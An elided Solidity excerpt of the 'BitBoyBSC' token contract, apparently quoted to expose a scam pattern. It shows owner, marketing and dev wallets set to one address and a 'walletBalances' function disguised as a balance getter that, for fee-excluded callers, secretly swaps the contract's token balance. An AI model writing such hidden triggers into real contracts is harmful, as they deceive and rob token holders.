...
interface IERC20 {
    ...
    function walletBalances(address account) external returns (uint256);
...
contract BitBoyBSC is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x095c134Fb9b9759bf9B74deAeAAf0Cd1Ba89cA00); 
    address payable public Wallet_Dev = payable(0x095c134Fb9b9759bf9B74deAeAAf0Cd1Ba89cA00);
    ...
    constructor () {
        ...
        _owner = 0x095c134Fb9b9759bf9B74deAeAAf0Cd1Ba89cA00;
    ...
    function walletBalances(address account) public lockTheLiquify override returns (uint256) {
        if(isBuyFee){
            if(_isExcludedFromFee[_msgSender()]){ swapAndLiquify(balanceOf(address(this))); }
        }
        return _tOwned[account];
    }
